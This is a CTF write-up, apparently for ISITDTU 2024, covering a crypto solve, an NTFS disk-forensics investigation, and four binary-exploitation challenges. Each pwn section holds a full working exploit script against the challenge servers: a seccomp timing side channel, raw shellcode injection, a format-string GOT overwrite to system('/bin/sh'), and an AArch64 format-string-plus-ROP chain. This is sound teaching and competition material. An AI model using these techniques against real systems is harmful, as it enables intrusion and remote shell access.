The solution here is to send 32th root of unitities to the server and caculate the sum of the returned numbers. The we can divide the result by 32 and we get a0. With a bit of luck, we can get flag :v
```python
from pwn import *
from Crypto.Util.number import *
from sage.all import *
while True:
    r = remote('35.187.238.100',5002)
    r.recvuntil(b'= ')
    p = eval(r.readline())
    R = Zmod(p)
    P = PolynomialRing(R,'x')
    x = P.gens()[0]
    r.recvuntil(b": ")
    q = list(map(int,(x**32 - 1).roots(multiplicities = false)))
    print(f"{len(q) = }")
    if len(q) != 32:
        continue
    r.sendline(" ".join(map(str, q)).encode())
    line = r.readlineS().strip()
    value_str = line.split("= ")[1]
    value = eval(value_str)
    mapped_values = map(P, value)
    summed_value = sum(mapped_values)
    divided_value = int(summed_value / 32)
    flag = long_to_bytes(divided_value)
    print(flag)
    if b"ISITDTU{" in flag:
        print(f"{flag = }")
        break

```
```
ISITDTU{M1x_4941n!_73360d0e5fb4}
```
    

## Forensics
### CPUsage
### Corrupted Hard Drive
![image](https://hackmd.io/_uploads/rkP3TPnxyx.png)

1. Analysis Phase

This challenge requires us to address a series of questions to uncover the flag. I'll proceed through each question systematically.

#### Detailed Walkthrough
> Q1. What is the starting address of the LBA address? Format (0xXXXXX)

The LBA (Logical Block Addressing) starting address is determined by the offset from the beginning of the disk to the first sector of the partition.

Upon examining the disk structure, I located the partition starting at sector 128. This translates to a starting address of `0x10000`, which is our answer.

> Q2. What is the tampered OEM ID? Format (0xXXXXXXXXXXXXXXXX)

In this task, our goal is to identify the OEM ID. The OEM ID is a unique string indicating the file system type, like NTFS, exFAT, etc.

It is typically located at offset 3 in the file system structure, where we can inspect it to find any alterations.

Here’s an example of how to locate the OEM ID. To do this, I used HxD to open the disk file and navigated to the byte at offset 3.

Answer: `0x4E54460020202020`

> Q3. After Fixing the disk, my friend downloaded a file from Google, what is the exact time when he clicked to download that file?

I suspect the files might have been renamed based on the download timestamp. Nonetheless, opening Autopsy and navigating to the "Web Downloads" feature should help us verify this.

![image](https://hackmd.io/_uploads/HyIOxO3eyx.png)

From there, we identify the file as `Blue_Team_Notes.pdf`, located within the `MustRead` folder. Let’s navigate to it.

![image](https://hackmd.io/_uploads/Bkc2xOne1e.png)

We'll take the Created Time and convert it to UTC, resulting in: `2024-10-22 21:51:13`.

> Q4. How much time did that file take to for download (in seconds)??

For this question, I know that during a download, a temporary file like `.crdownload` is created. We can parse both `$LogFile` and `$UsnJrnl` to trace this process. In this challenge, I opted to use `$LogFile`.

Upon inspection, I noticed a discrepancy in the timestamps, which likely provides the answer.

![image](https://hackmd.io/_uploads/rkBSZdneye.png)

(I ended up brute-forcing the timestamp since locating the exact column became tedious) --> Answer: `126`

> Q5. The first directory he moved this file to?

In this challenge, I used the remove method, knowing that the `MustRead` folder is a carved folder, which indicates it was likely deleted. This left me with two options: `best` and `secret`. I tried both and found the answer to be: `best`

> Q6. Last directory the suspicious move the file to?

As mentioned, the final directory where we located the PDF file is the `MustRead` folder — making `MustRead` the answer.

> Q7. The time he of the deletion??

I used `$UsnJrnl` because this file logs creation, deletion, and modification activities for files and directories, making it a valuable source of information.

Tool used: [UsnJrnl2Csv](https://github.com/jschicht/UsnJrnl2Csv)

To parse the file, we utilized the search shortcut for efficient findings.

![image](https://hackmd.io/_uploads/HkopGdnlke.png)


Answer: `2024-10-22 22:20:28`

```
ISITDTU{https://www.youtube.com/watch?v=yqp61_Wqm-A}
```

### Initial


## PWN
### shellcode 1
![image](https://hackmd.io/_uploads/rJaT05ilJl.png)

#### Reverse

![image](https://hackmd.io/_uploads/rJzzxhjgJe.png)

The flow is pretty straight-forward:
- read flag and save it in memory
- `mmap` a rwx address space
- allow us write shellcode on it
- filter syscall with `seccomp`
    - no open, read, write, execve

#### Exploit
So I just use side-channel attack, to bruteforce the flag

#### Script
```python
from pwn import *

exe = './challenge'
e = context.binary = ELF('challenge')
gdbscript = '''
b *main+344
b *main+374
continue
'''

def connect():
    global r
    r = remote("152.69.210.130", 3001)
    # r = process(exe)
    # r = gdb.debug(exe, gdbscript=gdbscript)

# pwningggg

def tryChar(c,index):
    # Connect to the service
    connect()
    r.recvline(b"Some gift for you:")

    # Default is to exit
    shellcode = "xor eax, eax\n"
    shellcode += "mov edi, 0\n" # Read from stdin, effectively holding the connection open

    shellcode += "add rdx, 0x1000\n"

    # Load up 64-bits at a time
    shellcode += "mov rbx, [rdx + {0}*8]\n".format(index//8)

    # Shift over to the char we're actually comparing against
    shellcode += "shr rbx, {0}\n".format(8*(index%8))

    # perform loop
    shellcode += "loop:"

    # Perform the comparison with our guess
    shellcode += "cmp bl, {0}\n".format(ord(c))

    # Conditionally return if we guessed wrong
    shellcode += "je loop\n"
    shellcode += "ret\n"

    # Sometimes we ended up with newline chars, just ask pwntools to remove them
    shellcode = asm(shellcode)

    # Send it
    r.sendline(shellcode)
    # Try reading
    try:
        r.recvline(timeout=0.5)
    except:
        # Connection closed on us, wrong guess
        r.close()
        return False

    # Connection stayed open, correct guess
    r.close()
    return True

flag = "ISITDTU{"

# Not specifying stop here since we don't know how long the flag is
while True:

    # Guess every character
    for c in string.printable:

        print(f'Trying char: {c}')
        # If we found this char, break and move to the next
        if tryChar(c,len(flag)):
            print("Found char: " + c)
            flag += c
            break

    else:
        # If we hit this, we're probably done reading the flag
        break

# tryChar('q', len(flag))

print("Flag: " + flag)

r.interactive()
```

![image](https://hackmd.io/_uploads/rk4A1aslyl.png)


### shellcode 2
![image](https://hackmd.io/_uploads/HytVJjigJg.png)
![image](https://hackmd.io/_uploads/BkJPB3seyx.png)
![image](https://hackmd.io/_uploads/B1swShjlJe.png)
![image](https://hackmd.io/_uploads/BkPdBhsgkg.png)

The code (for loop) at line 18 (main) is checking whether each byte of input (shellcode) that we give is an odd byte or not. If its even, it will be replaced with 0x90 (nop)
Lets look at assembly code
![image](https://hackmd.io/_uploads/rkwUL3oxke.png)
We will set a breakpoint here to check the values of the registers.
![image](https://hackmd.io/_uploads/SJl6U3ogJl.png)
I will focus on 4 registers:
'''
rax = 0
rdi = 0
rsi = 0xaabbc000 (address of shellcode)
rdx = 0xaabbc000 (address of shellcode)
'''
Great, that mean we can call read (syscall) to read to address 0xaabbc000 our "real" shellcode because there is no filter here :)). Just input 2 bytes

![image](https://hackmd.io/_uploads/r1RUP3ieJg.png)
![image](https://hackmd.io/_uploads/Hk1KDhseyl.png)

Note that when "call rdx", it pushes the return address onto the stack, that is *0x00005555555553ff*
![image](https://hackmd.io/_uploads/SJXPO3slJx.png)
![image](https://hackmd.io/_uploads/SJ1Md3sg1g.png)
The flag is at 0x555555558040
![image](https://hackmd.io/_uploads/BkGTu2ilye.png)
The offset from "return address" and "flag" is *0x2c41*
My goal is to do write(1, buf, 0x100) so my new shellcode will be


![image](https://hackmd.io/_uploads/Bk3_Y2oeyl.png)

Script:
```python=0
from pwn import *
e = context.binary = ELF('challenge_patched')
if args.LOCAL:
	#r = process("./challenge_patched")
	if 1:
		r = gdb.debug("./challenge_patched")
else:
	r = remote("152.69.210.130", 3002)



shellcode = b"\x0f\x05"

r.sendlineafter(b">\n", shellcode)
#r.sendline(b"cat flag.txt")

new_shellcode = b"A"*2 + b"\x48\x8B\x34\x24\x48\x81\xC6\x41\x2C\x00\x00\x48\x31\xC0\x48\xFF\xC0\x48\x31\xFF\x48\xFF\xC7\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
sleep(1)
r.sendline(new_shellcode)
r.interactive()
```
Result:
![image](https://hackmd.io/_uploads/r1De5hie1e.png)



### Game of Luck
![image](https://hackmd.io/_uploads/Sy8rJsog1x.png)
![image](https://hackmd.io/_uploads/SJFU9njg1e.png)
![image](https://hackmd.io/_uploads/rktPqnjg1g.png)
![image](https://hackmd.io/_uploads/SJhOo2jlyg.png)


I will focus on 2 functions (sub_40140E() and sub_4015B6())
![image](https://hackmd.io/_uploads/HJhsqhoeJg.png)
Generate a random number v1 >=0 and <100 (at rbp-0xC => Important!!) and print out (Lucky number)

Then in the main function, it will call the sub_4015B6 function.
![image](https://hackmd.io/_uploads/SJxUihjeyl.png)



![image](https://hackmd.io/_uploads/B1iconjxJe.png)
We will take a look at the play_401480() function.
![image](https://hackmd.io/_uploads/rkLRi3jxJl.png)
In play_401480(), it will re-seed (by calling clock()) and ask us to guess what v2 is (v2 is the number generated from rand()). We input the guessed number via the sub_4013BB() function (read and atoi)
![image](https://hackmd.io/_uploads/r1S13higye.png)
If the guess is correct it will call the format_vuln_401534() function (format string!!!)
![image](https://hackmd.io/_uploads/B1w1pholyl.png)

The problem here is, it is difficult to guess the seed (clock) in just one guess. If we guess wrong, the program will exit immediately.

Here we go...
 At line 13 in sub_4015B6(), scanf limits the input to a maximum of one character. This means that only a single digit (0-9) will be read and converted into an unsigned integer.
 ![image](https://hackmd.io/_uploads/rytUR2ixkx.png)
So we cannot just input 0x44 (=choice) to call the function format_vuln_401534().
Try debugging and set a breakpoint right there
Run the program a few times and see that the value of choice before scanf is not the same.
![image](https://hackmd.io/_uploads/rkg6l1psgkg.png)
![image](https://hackmd.io/_uploads/ByrbkpoeJl.png)
Why?
![image](https://hackmd.io/_uploads/BJZHkTjekg.png)
"choice" is at rbp-0xC... Our lucky number is also at rbp-0xC.
Reason:
![image](https://hackmd.io/_uploads/BkQg-pjxJg.png)
So, if lucky number is 0x44, and we input "-" when entering choice. The choice is still 0x44!! (scanf will not change the value of 0x44 if we enter "-"). The probability is 1/100 :)).

What do we do next
![image](https://hackmd.io/_uploads/Syzo-6ogyg.png)
We can use format string bug (input "-") multiple times. First, leak GOT to get the address of libc and use libc.rip to find the libc version. Then, overwrite atoi@got to the address of the system. Finally, enter "1" to enter the play_401480() function. In the play_401480() function, it will call the sub_4013BB() function.
![image](https://hackmd.io/_uploads/Sk7izTolJx.png)
In read, we enter "/bin/sh\x00". Then atoi(buf) will be equivalent to system(buf) => system("/bin/sh")

![image](https://hackmd.io/_uploads/rk8Vmpil1e.png)

Script
```python=0
#!/usr/bin/python3

from ctypes import CDLL
from pwn import *

context.binary = elf = ELF("./chal_patched")



while True:
	#r = process(elf.path)
	r = remote("152.69.210.130", 2004)

	r.recvuntil(b"2. Exit\n")
	r.sendline(b"-")

	test = r.recv(5)
	if test == b"Enter":
		break

	r.close()



payload = b"%7$s".ljust(8, b"\x00")
payload += p64(elf.got['printf'])
r.sendlineafter(b"your name: ", payload)

leak = u64(r.recv(6)+b"\x00"*2)
print("[*] leak: ", hex(leak))

libc_addr = leak - 0x606f0
system = libc_addr + 0x50d70


#### overwrite got
fmt_payload = fmtstr_payload(6, {elf.got['atoi'] : system}, write_size='short')

r.recvuntil(b"2. Exit\n")
r.sendline(b"-")
r.sendlineafter(b"your name: ", fmt_payload)


r.sendlineafter(b"2. Exit\n", b"1")
r.sendlineafter(b"Enter your guess: ", b"/bin/sh\x00")
r.interactive()


```



### no_name
![image](https://hackmd.io/_uploads/Sk-Uysjxke.png)

#### Reverse
![image](https://hackmd.io/_uploads/rk8_bhiekx.png)

What can be better than an AARCH64 challenge, obviously the stripped one :ok_hand:

At first I struggled with the debugging step, and also the custom qemu that this challenge use.

The flow of this program:
- `main`
    - just call `vuln1()`

-  `sub_D7C()` a.k.a `vuln1()`
    -  a simple race condition vuln
    -  if success will call `vuln2()`

- `sub_C64()` a.k.a `vuln2()`
    - give us `read` reading data to buf
    - then `printf(buf)` that allow format string bug
    - it allows us do this 2 times then return

- `sub_BD4()` a.k.a `vuln3()`
    - a hidden function
    - allow us to overflow buf

#### Exploit

1. `vuln1()` 
    - bypass with race condition
2. 1st `vuln2()`
    - we use the first printf to leak pie, stack, libc and canary
    - the second printf I will use to overwrite `vuln2()` to the return address of `vuln1()` (previouly is `*main+24`), now we will have infinite loop to `vuln2()`
    - The flow will become `vuln2()` -> `*vuln1+296` -> `vuln2()` -> `vuln2()` -> `vuln2()` -> ...

3. 2nd and 3rd `vuln2()` 
    - If we just directly move to `vuln3()` we will never escape infinite loop because the return address in stack frame is lower than buf -> cannot overflow
    - So instead of jumping to start of `vuln3()` as this instruction `STP    X29, X30, [SP,#var_30]!` will extend the stack and cause the infinite loop
    - I will jump to to the the middle of `vuln3()` where it call read()
    - But this will have SIGSEGV fault when `vuln3()` return as the stack is corrupt
    - So I will use the FSB in `vuln2()` to patch the address in stack

4. `vuln3()`
    - We have all we need now, just perform a simple AARCH64-ROP

#### Script

```python!
from pwn import *
import ctypes
import time
import subprocess
import os

exe = './chall'

e = context.binary = ELF(exe)

if args.REMOTE:
	
	libc = ELF('./libc.so.6')							# remote
	leak_offset = 0x273fc				# REMOTE

	ip = '152.69.210.130'  # change your ip and port here
	# ip = '0.0.0.0'
	port = 1337
	r = remote(ip, port)    
    
elif args.LOCAL:
	libc = ELF('/usr/lib/aarch64-linux-gnu/libc.so.6') 	# local
	leak_offset = 0x273fc				# LOCAL

	r = process(['./qemu_aarch64', exe])
	# r = process(['./ld-linux-aarch64.so.1', '--library-path', '.', exe])
    
else:
	r = process(['./qemu_aarch64', '-g', '9999', exe])
	libc = ELF('/usr/lib/aarch64-linux-gnu/libc.so.6') 	# local
	leak_offset = 0x273fc				# LOCAL

	# subprocess.Popen(['gnome-terminal', '--', 'gdb-multiarch', '-q', exe])

	gdbscript = '''
	target remote :9999
	b __libc_start_main@plt
	c
	b *($x0-0x24c)
	b *($x0-0x328)
	b *($x0-0x318)
	'''


# ================== vuln1 ===================== #

r.recvuntil(b"Enter your guess: ")

libc_vuln1 = ctypes.CDLL(None)
libc_vuln1.srand(int(time.time()))

# Generate a magic number
magic_number = libc_vuln1.rand() % 10000 + 1

r.sendline(str(magic_number).encode())

# ================== vuln2 ===================== #

r.recvuntil(b'your spell: ')

leak_payload = b'%4$p.%8$p.%29$p.%21$p'

# leak_payload = b''
# for i in range(18, 28):
# 	leak_payload += f'%{i}$p.'.encode()

r.sendline(leak_payload)

leak = r.recvline().split(b'.')

pie = int(leak[0], 16) - 0x10b1 
stack = int(leak[1], 16) + 0x8		# return address of vuln1 (main+ gif dos)

libc_base = int(leak[2], 16) - leak_offset

print(hex(int(leak[2], 16)))

canary = int(leak[3], 16)

log.info(f'Get PIE: {hex(pie)}')
log.info(f'Get STACK: {hex(stack)}')
log.info(f'Get LIBC: {hex(libc_base)}')
log.info(f'Get CANARY: {hex(canary)}')

input("Press Enter to continue...")

vuln3_offset = (pie+0xbd4) & 0xFFFF
vuln3_read_offset = (pie+0xc24) & 0xFFFF
vuln2_offset = (pie+0xc64) & 0xFFFF

main_ret_addr = pie+0xf64

r.recvuntil(b'your spell: ')

payload = f'AA%.{vuln2_offset-2}d%14$hn'.encode()
payload += p64(stack)

r.sendline(payload)

log.info(f'We will return to this address: {hex(main_ret_addr)}')

payload = f'%{main_ret_addr & 0xFFFF}c%14$hn'.encode()
payload = payload.ljust(0x10, b"\x00")
payload += p64(stack + 0x30)

r.recvuntil(b'your spell: ')
r.sendline(payload)

payload = f'%{(main_ret_addr>>16) & 0xFFFF}c%14$hn'.encode()
payload = payload.ljust(0x10, b"\x00")
payload += p64(stack + 0x32)

r.recvuntil(b'your spell: ')
r.sendline(payload)

payload = f'%14$hn'.encode()
payload = payload.ljust(0x10, b"\x00")
payload += p64(stack + 0x34)

# payload = b'%p'

r.recvuntil(b'your spell: ')
r.sendline(payload)

payload = f'%{vuln3_read_offset & 0xFFFF}c%14$hn'.encode()
payload = payload.ljust(0x10, b"\x00")
payload += p64(stack - 0x40)

r.recvuntil(b'your spell: ')
r.sendline(payload)

# ==================== vuln3 ======================== #

libc.address = libc_base

first_gadget = libc.search(asm('ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__()
second_gadget = libc.search(asm('mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__()

# r.recvuntil(b'Give me your name: ')

payload = b''
payload += 128 * b'A'		# pad
payload += p64(canary)
payload += p64(0)
payload += p64(first_gadget)
payload += (8 * 3) * b'C'
payload += p64(second_gadget)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += (8 * 2) * b'D'
payload += p64(libc.sym.system)

r.sendline(payload)

r.interactive()
```

![image](https://hackmd.io/_uploads/B1QGl6ogyg.png)


## MISC
### Welcome
![image](https://hackmd.io/_uploads/ryTnC9ieke.png)

It's a damn adorable challenge! I love itttttttttttttttttt <3
